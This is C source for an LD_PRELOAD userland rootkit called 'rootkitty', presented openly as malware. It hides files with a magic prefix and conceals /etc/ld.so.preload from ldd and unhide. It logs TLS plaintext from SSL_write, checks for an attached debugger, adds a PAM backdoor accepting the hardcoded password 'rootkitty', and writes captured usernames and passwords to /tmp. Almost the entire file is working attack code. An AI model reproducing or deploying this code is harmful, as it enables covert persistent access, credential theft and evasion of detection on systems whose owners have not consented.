/*---------[ PREPROCESSOR ]---------*/
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <stdio.h>
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <stdlib.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#define STR_LEN(str) sizeof(str)-1
#define MAGIC_PREFIX "rootkitty"
#define MAGIC_LEN STR_LEN(MAGIC_PREFIX)
#define MAGIC_PASS "rootkitty"
/*---------[ PROTOTYPES ]---------*/
static struct dirent*   (*og_readdir)(DIR *)       = NULL;
static struct dirent64* (*og_readdir64)(DIR *dir)  = NULL;
static int (*og_SSL_write)(SSL*, const void*, int) = NULL;
static int (*og_pam_sm_auth)(pam_handle_t*, int, int, const char**) = NULL;
static int (*og_pam_auth)(pam_handle_t *pamh, int flags) = NULL;
static int (*og_execve)(const char *pathname, char *const argv[], char *const envp[]) = NULL;
static int (*og_pam_get_item)(const pam_handle_t*, int, const void**) = NULL;
int isDebuggerPresent();

/*---------[ INITIALIZE THE HOOKS ]---------*/
__attribute__((constructor)) void hook_init(void){
  og_readdir    = (struct dirent* (*)(DIR*))dlsym(RTLD_NEXT, "readdir");
  og_readdir64  = (struct dirent64* (*)(DIR*))dlsym(RTLD_NEXT, "readdir64");
  og_SSL_write  = (int (*)(SSL*, const void*, int))dlsym(RTLD_NEXT, "SSL_write");
  og_pam_sm_auth = (int (*)(pam_handle_t*, int, int, const char**))dlsym(RTLD_NEXT, "pam_sm_authenticate");
  og_pam_auth = (int (*)(pam_handle_t *, int flags))dlsym(RTLD_NEXT, "pam_authenticate");
  og_execve = (int (*)(const char*, char *const argv[], char *const envp[]))dlsym(RTLD_NEXT, "execve");
  og_pam_get_item = (int (*)(const pam_handle_t*, int, const void**))dlsym(RTLD_NEXT, "pam_get_item");
}
/*---------[ HOOK EXECVE TO HIDE THE LD.SO.PRELOAD FILE ]---------*/
int execve(const char *pathname, char *const argv[], char *const envp[]) {
  char* ldd = "/bin/ldd";
  char* unhide = "/bin/unhide";
  char* normal = "/etc/ld.so.preload";
  char* hidden = "/etc/.ld.so.preload";

  if (strcmp(pathname,ldd)==0 || strcmp(pathname,unhide)==0) {
    uid_t old_uid = getuid();
    seteuid(0);
    rename(normal, hidden);  // Hide file
    sleep(2);
    rename(hidden, normal); // Restore file
    seteuid(old_uid);
  }
  return og_execve(pathname, argv, envp);
}
/*---------[ HIDING FILES ]---------*/
struct dirent* readdir(DIR *dirp){
  struct dirent* entry;
  while ((entry = og_readdir(dirp)) != NULL) {
    if (strncmp(entry->d_name, MAGIC_PREFIX, MAGIC_LEN) == 0) {
      continue;    
    }
    return entry;
  }
  return entry;
}
// handle 64bit version
// DOESNT FUCKING WORK
struct dirent64* readdir64(DIR* dirp) {
  struct dirent64* entry;
  while ((entry = og_readdir64(dirp)) != NULL) {
    if (strncmp(entry->d_name, MAGIC_PREFIX, MAGIC_LEN) == 0) {
      continue;
    }
    return entry;
  }
  return entry;
}

/*---------[ INTERCEPTING SSL_WRITE ]---------*/ 
int SSL_write(SSL* ssl, const void *buf, int num) {
  char path[] = "/tmp/rootkitty_SSLlog.txt";

  if (!isDebuggerPresent()){
    return og_SSL_write(ssl, buf, num);
  }

  FILE* fd = fopen(path, "a+");
  
  if (fd != NULL){
    fprintf(fd, "PID:%d\n", getpid());
    fwrite(buf, 1, num, fd);
    fprintf(fd, "\n");
    fclose(fd);
  }
  return og_SSL_write(ssl, buf, num);
}
/*---------[ PAM BACKDOOR ]---------*/
int pam_sm_authenticate(pam_handle_t* pamh, int flags, int argc, const char** argv){
  int retval = og_pam_sm_auth(pamh, flags, argc, argv);
  const char* password;

  if (pam_get_item(pamh, PAM_AUTHTOK, (const void**)&password) == PAM_SUCCESS) {
    if (strcmp(password, MAGIC_PASS)== 0) {
      retval = PAM_SUCCESS;
    }
  }
  return retval;
}

int pam_authenticate(pam_handle_t *pamh, int flags) {
  int retval = og_pam_auth(pamh, flags);
  const char *password;

  if (pam_get_item(pamh, PAM_AUTHTOK, (const void**)&password) == PAM_SUCCESS) {
    if (strcmp(password, MAGIC_PASS) == 0) {
      retval = PAM_SUCCESS;
    }
  }
  return retval;
}
/*---------[ PAM EXFILTRATION ]---------*/
int pam_get_item(const pam_handle_t *pamh, int item_type, const void**item){
  int rv;
  const char* name;
  FILE* fd;
  
  rv = og_pam_get_item(pamh, item_type, item);
  if (rv == PAM_SUCCESS && item_type == PAM_AUTHTOK && *item != NULL){
    pam_get_user((pam_handle_t*)pamh, &name, NULL);
    fd = fopen("/tmp/rootkitty_passdump.txt", "w+");
    if (fd != NULL){
      fprintf(fd, "name: %s\nitem: %s", name, (char*)*item);
    }
    fclose(fd);
  }
  return rv;
}
/*---------[ ANTI DEBUGGER CHECK ]---------*/
int isDebuggerPresent(){
  FILE* f;
  char buffer[1024];
  int result = 0;
  int pid = 0;

  f = fopen("/proc/self/status", "r");
  if (f == NULL) {
    perror("[-] Cannot open file.");
    exit(EXIT_FAILURE);
  }

  while (fgets(buffer, sizeof(buffer), f)) {
    if (strncmp(buffer, "TracerPid:", 10)==0){
      pid = atoi(buffer+10);
      if (!pid) {
        result = 1;
        break;
      }
    }
  }
  fclose(f);
  return result;
}
